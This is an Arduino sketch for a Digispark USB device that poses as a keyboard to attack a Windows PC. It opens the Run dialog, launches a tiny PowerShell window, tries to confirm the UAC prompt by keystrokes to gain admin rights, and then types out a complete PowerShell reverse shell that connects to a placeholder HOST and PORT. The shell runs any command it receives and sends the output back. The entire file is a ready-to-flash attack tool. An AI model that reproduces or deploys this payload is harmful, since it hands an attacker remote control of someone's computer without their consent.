#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);

  digitalWrite(1, HIGH);
  delay(1000);
  digitalWrite(1, LOW);
  delay(1000);
  digitalWrite(1, HIGH);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win + R opens application "run"
  DigiKeyboard.delay(2000); //Wait 2 seconds
  DigiKeyboard.print("powershell -noexit -command \"mode con cols=18 lines=1\""); // Opens tiny PowerShell
  DigiKeyboard.sendKeyStroke(KEY_TAB); // UAC
  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Turn on admin privileges
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Run
  DigiKeyboard.delay(2000);
  DigiKeyboard.println(F("$c=New-Object System.Net.Sockets.TCPClient('HOST',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b, 0, $b.Length)) -ne 0){;$r=([text.encoding]::ASCII).GetBytes((iex ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i)) 2>&1 | Out-String )+'PS '+(pwd).Path+'> ');$s.Write($r,0,$r.Length);$s.Flush();};$c.Close();")); // PS-min payload
}

void loop() {
  digitalWrite(1, HIGH);
  delay(1000);
  digitalWrite(1, LOW);
  delay(1000);
  digitalWrite(1, HIGH);
}